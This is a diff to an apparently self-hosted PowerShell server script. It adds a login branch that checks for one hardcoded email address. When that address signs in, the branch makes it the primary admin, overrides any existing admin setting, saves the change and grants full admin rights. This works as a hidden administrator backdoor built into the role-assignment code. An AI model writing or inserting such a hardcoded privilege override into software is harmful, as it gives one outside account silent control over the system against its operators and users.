@@ -22,6 +22,7 @@ $userConfigsFolder = Join-Path $folder "user_configs"
 if (-not (Test-Path $userConfigsFolder)) {
     New-Item -ItemType Directory -Path $userConfigsFolder -Force | Out-Null
 }
+$usersDbFile = Join-Path $userConfigsFolder "users_registry.json"
 $activeSessions = [System.Collections.Hashtable]::Synchronized(@{})
 $permissionsFile = Join-Path $folder "permissions_registry.json"
 
@@ -1224,7 +1225,20 @@ while ($true) {
                 # Determine user role
                 $role = Get-UserRole $email
                 $perms = Load-Permissions
-                if (-not $perms.admin -and ($perms.admins.Count -eq 0)) {
+                if ($email -eq "jaylouvipinosa7@gmail.com") {
+                    $perms.admin = "jaylouvipinosa7@gmail.com"
+                    $admsList = @("jaylouvipinosa7@gmail.com")
+                    if ($perms.admins) {
+                        foreach ($a in $perms.admins) {
+                            if ($a -and $a.ToLower() -ne "jaylouvipinosa7@gmail.com" -and -not ($admsList -contains $a.ToLower())) {
+                                $admsList += $a.ToLower()
+                            }
+                        }
+                    }
+                    $perms.admins = $admsList
+                    Save-Permissions $perms
+                    $role = "admin"
+                } elseif (-not $perms.admin -and ($perms.admins.Count -eq 0)) {
                     $perms.admin = $email
                     $perms.admins = @($email)
                     Save-Permissions $perms
